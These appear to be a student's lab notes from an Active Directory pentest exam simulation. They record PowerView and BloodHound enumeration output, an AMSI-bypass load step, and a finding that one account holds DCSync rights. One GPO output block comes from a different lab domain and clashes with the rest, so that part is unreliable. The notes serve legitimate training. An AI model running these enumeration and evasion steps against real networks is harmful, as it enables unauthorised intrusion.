# Attacker Machine (`studvm`)

## ???

### Domain Enumeration

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
tech\studentuser👤
```

`hostname`:
```
studvm🖥️
```

`ipconfig`:
```
Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::dca5:8ad4:c3fa:8934%4
   IPv4 Address. . . . . . . . . . . : 172.16.100.1🌐
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.100.254
```

`cd C:\AD\Tools`

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

#### Domain Enumeration | Domains, Forests, Trusts (with PowerView)

**Domain Enumeration | Forests**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-Domain`:
```
Forest                  : finance.corp🏰
DomainControllers       : {tech-dc.tech.finance.corp}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : finance.corp
PdcRoleOwner            : tech-dc.tech.finance.corp
RidRoleOwner            : tech-dc.tech.finance.corp
InfrastructureRoleOwner : tech-dc.tech.finance.corp
Name                    : tech.finance.corp🏛️
```

`Get-Forest`:
```
RootDomainSid         : S-1-5-21-1712611810-3596029332-2671080496
Name                  : finance.corp🏰
Sites                 : {Default-First-Site-Name}
Domains               : {finance.corp🏛️, tech.finance.corp🏛️}
GlobalCatalogs        : {finance-dc.finance.corp, tech-dc.tech.finance.corp}
ApplicationPartitions : {DC=ForestDnsZones,DC=finance,DC=corp, DC=DomainDnsZones,DC=tech,DC=finance,DC=corp, DC=DomainDnsZones,DC=finance,DC=corp}
ForestModeLevel       : 7
ForestMode            : Unknown
RootDomain            : finance.corp🏛️
Schema                : CN=Schema,CN=Configuration,DC=finance,DC=corp
SchemaRoleOwner       : finance-dc.finance.corp
NamingRoleOwner       : finance-dc.finance.corp
```

**Domain Enumeration | Domains**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-ForestDomain -Verbose`:
```
Forest                  : finance.corp
DomainControllers       : {finance-dc.finance.corp}🖥️
Children                : {tech.finance.corp}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : finance-dc.finance.corp
RidRoleOwner            : finance-dc.finance.corp
InfrastructureRoleOwner : finance-dc.finance.corp
Name                    : finance.corp🏛️

Forest                  : finance.corp
DomainControllers       : {tech-dc.tech.finance.corp}🖥️
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : finance.corp
PdcRoleOwner            : tech-dc.tech.finance.corp
RidRoleOwner            : tech-dc.tech.finance.corp
InfrastructureRoleOwner : tech-dc.tech.finance.corp
Name                    : tech.finance.corp🏛️
```

**Domain Enumeration | Trusts**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainTrust`:
```
SourceName      : tech.finance.corp🏛️
TargetName      : finance.corp🏛️
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST🔗
TrustDirection  : Bidirectional🔗
WhenCreated     : 2/2/2022 6:53:13 AM
WhenChanged     : 3/11/2025 8:53:24 AM
```

`Get-ForestTrust`:
```
```
❌

| Forest       | Domain              | Parent Domain   | Domain Controllers                | Trusts                              |
|-------------|---------------------|----------------|-----------------------------------|-------------------------------------|
| finance.corp | finance.corp       | -              | finance-dc.finance.corp          | -                                   |
| finance.corp | tech.finance.corp  | finance.corp   | tech-dc.tech.finance.corp        | Bidirectional trust with finance.corp (WITHIN_FOREST) |

#### Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)

**Domain Enumeration | Users**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainUser`:
```
pwdlastset             : 3/16/2022 3:56:32 AM
logoncount             : 52
badpasswordtime        : 3/16/2022 3:39:50 AM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=tech,DC=finance,DC=corp
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 3/11/2025 1:52:58 AM
samaccountname         : Administrator
logonhours             : @{Tuesday=System.Collections.Hashtable; Friday=System.Collections.Hashtable; Wednesday=System.Collections.Hashtable; Saturday=System.Collections.Hashtable;
                         Thursday=System.Collections.Hashtable; Monday=System.Collections.Hashtable; Sunday=System.Collections.Hashtable}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 12/31/1600 4:00:00 PM
countrycode            : 0
whenchanged            : 3/11/2025 8:52:58 AM
instancetype           : 4
usncreated             : 8196
objectguid             : ad9be59e-222e-4d75-8861-bf68e8f13b44
lastlogoff             : 12/31/1600 4:00:00 PM
whencreated            : 2/2/2022 6:53:13 AM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 7:09:30 AM, 2/2/2022 7:09:29 AM, 2/2/2022 6:54:21 AM...}
usnchanged             : 65578
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=tech,DC=finance,DC=corp, CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp,
                         CN=Administrators,CN=Builtin,DC=tech,DC=finance,DC=corp}
lastlogon              : 3/11/2025 1:59:35 AM
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid              : S-1-5-21-1325336202-3661212667-302732393-500
primarygroupid         : 513
iscriticalsystemobject : True
name                   : Administrator

[SNIP]
```

`whoami`:
```
tech\studentuser👤
```

`Get-DomainUser -Name 'studentuser'`:
```
logoncount            : 17
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=student user,CN=Users,DC=tech,DC=finance,DC=corp
objectclass           : {top, person, organizationalPerson, user}
displayname           : student user
lastlogontimestamp    : 3/11/2025 1:59:44 AM
userprincipalname     : studentuser
samaccountname        : studentuser👤
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 3/11/2025 8:59:44 AM
instancetype          : 4
usncreated            : 20893
objectguid            : f0a2b1ef-88bb-4463-8037-6d5f94c5cac3
sn                    : user
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 2/3/2022 3:47:16 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata : {2/4/2022 1:16:34 PM, 2/3/2022 3:47:16 PM, 1/1/1601 12:00:01 AM}
givenname             : student
usnchanged            : 65641
lastlogon             : 3/11/2025 2:10:35 AM
badpwdcount           : 0
cn                    : student user
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-1325336202-3661212667-302732393-1108
primarygroupid        : 513
pwdlastset            : 3/11/2025 1:59:37 AM
name                  : student user
```

`Get-DomainUser | select -ExpandProperty samaccountname`:
```
Administrator👤
Guest👤
krbtgt👤
studentuser👤
techservice👤
databaseagent👤
sqlserversync👤
```

**Domain Enumeration | Computers**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainComputer | select -ExpandProperty samaccountname`:
```
TECH-DC$🖥️
STUDVM$🖥️
MGMTSRV$🖥️
TECHSRV30$🖥️
DBSERVER31$🖥️
```

`Get-DomainComputer | select -ExpandProperty dnshostname`:
```
tech-dc.tech.finance.corp
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`notepad C:\AD\Tools\servers.txt`:
```
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

**Domain Enumeration | Groups**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainGroup | select -ExpandProperty samaccountname`:
```
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
```

`Get-DomainGroupMember -Identity 'RDPUsers'`:
```
```
❌

`Get-DomainGroupMember -Identity 'Remote Desktop Users'`:
```
```
❌

`Get-DomainGroup -UserName 'studentuser'`:
```
grouptype              : GLOBAL_SCOPE, SECURITY
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Users👥
whenchanged            : 2/2/2022 6:54:20 AM
objectsid              : S-1-5-21-1325336202-3661212667-302732393-513
objectclass            : {top, group}
cn                     : Domain Users
instancetype           : 4
usnchanged             : 12320
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:21 AM, 1/1/1601 12:04:17 AM}
name                   : Domain Users
description            : All domain users
memberof               : CN=Users,CN=Builtin,DC=tech,DC=finance,DC=corp
usncreated             : 12318
whencreated            : 2/2/2022 6:54:20 AM
distinguishedname      : CN=Domain Users,CN=Users,DC=tech,DC=finance,DC=corp
objectguid             : f1cf540d-3d23-47be-889d-d8c1e2a6b01c
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=finance,DC=corp
```

`Get-DomainGroup -Identity 'Domain Admins'`:
```
grouptype              : GLOBAL_SCOPE, SECURITY
admincount             : 1
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Admins👥
whenchanged            : 2/2/2022 7:09:29 AM
objectsid              : S-1-5-21-1325336202-3661212667-302732393-512
name                   : Domain Admins
cn                     : Domain Admins
instancetype           : 4
usnchanged             : 12905
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 7:09:29 AM, 2/2/2022 6:54:21 AM, 1/1/1601 6:12:16 PM}
objectguid             : 737831e2-8781-4176-8b69-81798b10da94
description            : Designated administrators of the domain
memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=tech,DC=finance,DC=corp, CN=Administrators,CN=Builtin,DC=tech,DC=finance,DC=corp}
member                 : CN=Administrator👤,CN=Users,DC=tech,DC=finance,DC=corp
usncreated             : 12315
whencreated            : 2/2/2022 6:54:20 AM
distinguishedname      : CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp
objectclass            : {top, group}
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=finance,DC=corp
```

`Get-DomainGroupMember -Identity 'Domain Admins'`:
```
GroupDomain             : tech.finance.corp
GroupName               : Domain Admins👥
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp
MemberDomain            : tech.finance.corp
MemberName              : Administrator👤
MemberDistinguishedName : CN=Administrator,CN=Users,DC=tech,DC=finance,DC=corp
MemberObjectClass       : user
MemberSID               : S-1-5-21-1325336202-3661212667-302732393-500
```

`Get-DomainGroupMember -Identity 'Enterprise Admins'`:
```
```
❌

`Get-DomainGroupMember -Identity 'Enterprise Admins' -Domain 'finance.corp'`:
```
GroupDomain             : finance.corp
GroupName               : Enterprise Admins👥
GroupDistinguishedName  : CN=Enterprise Admins,CN=Users,DC=finance,DC=corp
MemberDomain            : finance.corp
MemberName              : Administrator👑
MemberDistinguishedName : CN=Administrator,CN=Users,DC=finance,DC=corp
MemberObjectClass       : user
MemberSID               : S-1-5-21-1712611810-3596029332-2671080496-500
```

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`cd /AD/Tools`

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`iex (type C:\AD\Tools\amsibypass.txt)`

`Import-Module C:\AD\Tools\SharpHound.ps1`

`Invoke-BloodHound -CollectionMethod All`:
```
2025-03-11T08:07:18.9902876-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2025-03-11T08:07:18.9902876-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-11T08:07:19.0059188-07:00|INFORMATION|Initializing SharpHound at 8:07 AM on 3/11/2025
2025-03-11T08:07:19.1310778-07:00|WARNING|Common Library is already initialized
2025-03-11T08:07:19.1466851-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-11T08:07:19.1935793-07:00|INFORMATION|Beginning LDAP search for tech.finance.corp
2025-03-11T08:07:19.2404237-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-03-11T08:07:19.2404237-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-03-11T08:07:49.4776665-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 100 MB RAM
2025-03-11T08:08:04.5208726-07:00|INFORMATION|Consumers finished, closing output channel
2025-03-11T08:08:04.5833002-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-03-11T08:08:04.6770770-07:00|INFORMATION|Status: 93 objects finished (+93 2.066667)/s -- Using 102 MB RAM
2025-03-11T08:08:04.6770770-07:00|INFORMATION|Enumeration finished in 00:00:45.4891943
2025-03-11T08:08:04.6926864-07:00|INFORMATION|Saving cache with stats: 58 ID to type mappings.
 59 name to SID mappings.
 1 machine sid mappings.
 5 sid to domain mappings.
 0 global catalog mappings.
2025-03-11T08:08:04.6926864-07:00|INFORMATION|SharpHound Enumeration Completed at 8:08 AM on 3/11/2025! Happy Graphing!📌
```

![BloodHound Legacy | Analysis - Find all Domain Admins](crtp_exam_simulation_bloodhound_find_all_domain_admins.png)

![BloodHound Legacy | Analysis - Find Shortest Paths to Domain Admins](crtp_exam_simulation_bloodhound_find_shortest_paths_domain_admins.png)

![BloodHound Legacy | Analysis - Find Principals with DCSync Rights](crtp_exam_simulation_bloodhound_find_principals_with_dcsync_rights.png)

#### Domain Enumeration | ACLs, OUs, GPOs (with PowerView, BloodHound)

**Domain Enumeration | ACLs**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'studentuser'}`:
```
```
❌

`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'studentuser'}`:
```
```
❌

`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'techservice'}`:
```
```
❌

`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'databaseagent'}`:
```
```
❌

`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'sqlserversync'}`:
```
ObjectDN                : DC=tech,DC=finance,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : DS-Replication-Get-Changes-In-Filtered-Set📑
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
IdentityReferenceName   : sqlserversync👤
IdentityReferenceDomain : tech.finance.corp
IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
IdentityReferenceClass  : user

ObjectDN                : DC=tech,DC=finance,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : DS-Replication-Get-Changes📑
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
IdentityReferenceName   : sqlserversync👤
IdentityReferenceDomain : tech.finance.corp
IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
IdentityReferenceClass  : user

ObjectDN                : DC=tech,DC=finance,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : DS-Replication-Get-Changes-All📑
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
IdentityReferenceName   : sqlserversync👤
IdentityReferenceDomain : tech.finance.corp
IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
IdentityReferenceClass  : user
```

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'RDPUsers'}`:
```
```
❌

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Remote Desktop Users'}`:
```
```
❌

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Domain Admins'}`:
```
```
❌

`Get-PathAcl -Path '\\tech-dc.tech.finance.corp\sysvol'`:
```
Path              : \\tech-dc.tech.finance.corp\sysvol
FileSystemRights  : WriteOwner,WriteDAC,GenericWrite📑,GenericExecute,GenericRead
IdentityReference : Creator Owner
IdentitySID       : S-1-3-0
AccessControlType : Allow

[SNIP]
```

`Get-PathAcl -Path '\\finance-dc.finance.corp\sysvol'`:
```
Path              : \\finance-dc.finance.corp\sysvol
FileSystemRights  : WriteOwner,WriteDAC,GenericWrite📑,GenericExecute,GenericRead
IdentityReference : Creator Owner
IdentitySID       : S-1-3-0
AccessControlType : Allow

[SNIP]
```

**Domain Enumeration | OUs**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainOU`:
```
description            : Default container for domain controllers
systemflags            : -1946157056
iscriticalsystemobject : True
gplink                 : [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9}📑,CN=Policies,CN=System,DC=tech,DC=finance,DC=corp;0]
whenchanged            : 2/2/2022 6:53:08 AM
objectclass            : {top, organizationalUnit}
showinadvancedviewonly : False
usnchanged             : 7921
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:20 AM, 1/1/1601 12:04:17 AM}
name                   : Domain Controllers🗂️
distinguishedname      : OU=Domain Controllers,DC=tech,DC=finance,DC=corp
ou                     : Domain Controllers
usncreated             : 7921
whencreated            : 2/2/2022 6:53:08 AM
instancetype           : 4
objectguid             : b12891d1-8645-4d7e-b56b-105f86f17a38
objectcategory         : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=finance,DC=corp
```

`Get-DomainOU | select -ExpandProperty name`:
```
Domain Controllers🗂️
```

???

`Get-DomainObject -SearchBase 'OU=Domain Controllers,DC=tech,DC=finance,DC=corp' -Verbose`:
```
[SNIP]

description            : Default container for domain controllers
systemflags            : -1946157056
iscriticalsystemobject : True
gplink                 : [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9}📑,CN=Policies,CN=System,DC=tech,DC=finance,DC=corp;0]
whenchanged            : 2/2/2022 6:53:08 AM
objectclass            : {top, organizationalUnit}
showinadvancedviewonly : False
usnchanged             : 7921
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:20 AM, 1/1/1601 12:04:17 AM}
name                   : Domain Controllers🗂️
distinguishedname      : OU=Domain Controllers,DC=tech,DC=finance,DC=corp
ou                     : Domain Controllers
usncreated             : 7921
whencreated            : 2/2/2022 6:53:08 AM
instancetype           : 4
objectguid             : b12891d1-8645-4d7e-b56b-105f86f17a38
objectcategory         : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=finance,DC=corp

pwdlastset                    : 3/11/2025 1:48:39 AM
logoncount                    : 54
msds-generationid             : {159, 64, 30, 21...}
serverreferencebl             : CN=TECH-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=finance,DC=corp
badpasswordtime               : 12/31/1600 4:00:00 PM
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION📌
distinguishedname             : CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 3/11/2025 1:49:27 AM
samaccountname                : TECH-DC$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 3/11/2025 8:49:27 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2019 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=TECH-DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=tech,DC=finance,DC=corp
objectguid                    : 1afeeb35-bf84-44ff-8c6b-90b52fa90393
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 2/2/2022 6:54:19 AM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata         : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:20 AM, 1/1/1601 12:04:17 AM}
serviceprincipalname📌        : {ldap/tech-dc.tech.finance.corp/DomainDnsZones.tech.finance.corp, ldap/tech-dc.tech.finance.corp/ForestDnsZones.finance.corp,Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/tech-dc.tech.finance.corp, TERMSRV/TECH-DC...}
usncreated                    : 12293
usnchanged                    : 65558
lastlogon                     : 3/11/2025 1:55:07 AM
badpwdcount                   : 0
cn                            : TECH-DC
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-1325336202-3661212667-302732393-1000
primarygroupid                : 516
iscriticalsystemobject        : True
name                          : TECH-DC
ridsetreferences              : CN=RID Set,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
dnshostname                   : tech-dc.tech.finance.corp

ridnextrid                : 1600
usncreated                : 12423
name                      : RID Set
ridpreviousallocationpool : 9015136355904
whenchanged               : 2/8/2022 7:34:07 AM
objectclass               : {top, rIDSet}
cn                        : RID Set
usnchanged                : 38451
dscorepropagationdata     : {2/4/2022 1:16:34 PM, 1/1/1601 12:00:01 AM}
ridallocationpool         : 9015136355904
ridusedpool               : 0
distinguishedname         : CN=RID Set,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
showinadvancedviewonly    : True
whencreated               : 2/2/2022 6:54:29 AM
instancetype              : 4
objectguid                : 179af1dc-255b-4047-8af9-037e6d1beb7d
objectcategory            : CN=RID-Set,CN=Schema,CN=Configuration,DC=finance,DC=corp

usncreated             : 12871
name                   : DFSR-LocalSettings
whenchanged            : 2/2/2022 7:05:01 AM
objectclass            : {top, msDFSR-LocalSettings}
showinadvancedviewonly : True
usnchanged             : 12898
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 7:00:00 AM, 1/1/1601 12:00:01 AM}
msdfsr-flags           : 48
cn                     : DFSR-LocalSettings
msdfsr-version         : 1.0.0.0
distinguishedname      : CN=DFSR-LocalSettings,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
whencreated            : 2/2/2022 7:00:00 AM
instancetype           : 4
objectguid             : ec8f349d-1d3a-4857-baa9-a26a54c489e6
objectcategory         : CN=ms-DFSR-LocalSettings,CN=Schema,CN=Configuration,DC=finance,DC=corp

usncreated                  : 12874
name                        : Domain System Volume🗂️
msdfsr-memberreference      : CN=TECH-DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=tech,DC=finance,DC=corp
whenchanged                 : 2/2/2022 7:00:00 AM
objectclass                 : {top, msDFSR-Subscriber}
showinadvancedviewonly      : True
usnchanged                  : 12874
dscorepropagationdata       : {2/4/2022 1:16:34 PM, 2/2/2022 7:00:00 AM, 1/1/1601 12:00:01 AM}
cn                          : Domain System Volume
objectcategory              : CN=ms-DFSR-Subscriber,CN=Schema,CN=Configuration,DC=finance,DC=corp
distinguishedname           : CN=Domain System Volume,CN=DFSR-LocalSettings,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
whencreated                 : 2/2/2022 7:00:00 AM
instancetype                : 4
objectguid                  : 1e2e84c2-e6d5-4143-be3f-1bf04595a5fc
msdfsr-replicationgroupguid : {71, 172, 49, 152...}

msdfsr-stagingpath          : C:\Windows\SYSVOL\staging areas\tech.finance.corp
usncreated                  : 12875
msdfsr-options              : 0
name                        : SYSVOL Subscription
whenchanged                 : 2/2/2022 7:05:01 AM
msdfsr-rootpath             : C:\Windows\SYSVOL\domain📌
objectclass                 : {top, msDFSR-Subscription}
msdfsr-readonly             : False
cn                          : SYSVOL Subscription
usnchanged                  : 12899
dscorepropagationdata       : {2/4/2022 1:16:34 PM, 1/1/1601 12:00:01 AM}
objectcategory              : CN=ms-DFSR-Subscription,CN=Schema,CN=Configuration,DC=finance,DC=corp
distinguishedname           : CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
msdfsr-enabled              : True
showinadvancedviewonly      : True
msdfsr-contentsetguid       : {103, 232, 225, 147...}
whencreated                 : 2/2/2022 7:00:00 AM
instancetype                : 4
objectguid                  : da61a328-e550-4cb8-adcc-92ad27b52e82
msdfsr-replicationgroupguid : {71, 172, 49, 152...}

[SNIP]
```

???

**Domain Enumeration | GPOs**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainGPO`:
```
[SNIP]

flags                    : 0
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy📑
gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 2/2/2022 6:53:07 AM
versionnumber            : 1
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}📑
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
usnchanged               : 7792
dscorepropagationdata    : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:21 AM, 1/1/1601 12:00:00 AM}
objectguid               : 45fa190f-e4ce-44ff-af48-9afe0e692569
iscriticalsystemobject   : True
gpcfilesyspath           : \\tech.finance.corp\sysvol\tech.finance.corp\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}📁
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=tech,DC=finance,DC=corp
whencreated              : 2/2/2022 6:53:07 AM
showinadvancedviewonly   : True
usncreated               : 7792
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=finance,DC=corp

[SNIP]
```

`Get-DomainGPO | select -ExpandProperty displayname`:
```
Default Domain Policy📑
Default Domain Controllers Policy📑
```

`Get-DomainGPO -Identity (Get-DomainOU -Identity 'Applocked').gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)`:
```
flags                    : 0
displayname              : Applocker📑
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 1/6/2025 8:33:19 AM
versionnumber            : 15
name                     : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑
cn                       : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}
usnchanged               : 303528
dscorepropagationdata    : {1/6/2025 8:33:19 AM, 12/18/2024 8:31:49 AM, 12/18/2024 8:31:01 AM, 12/18/2024 8:30:36 AM...}
objectguid               : bcf4770b-b560-468b-88cb-6beaeb6793f9
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📁
distinguishedname        : CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 11/15/2022 4:21:20 AM
showinadvancedviewonly   : True
usncreated               : 45231
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

???

`notepad C:/AD/Tools/FindInterestingRightsDCsGPO.ps1`:
```powershell
Get-DomainObjectAcl -Identity (Get-DomainOU -Identity 'Domain Controllers').gplink.substring(11,(Get-DomainOU -Identity 'Domain Controllers').gplink.length-72) -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteDACL|GenericAll|WriteOwner" } |
ForEach-Object {
    $sam = ConvertFrom-SID $_.SecurityIdentifier
    [PSCustomObject]@{
        SamAccountName       = $sam
        ActiveDirectoryRights = $_.ActiveDirectoryRights
    }
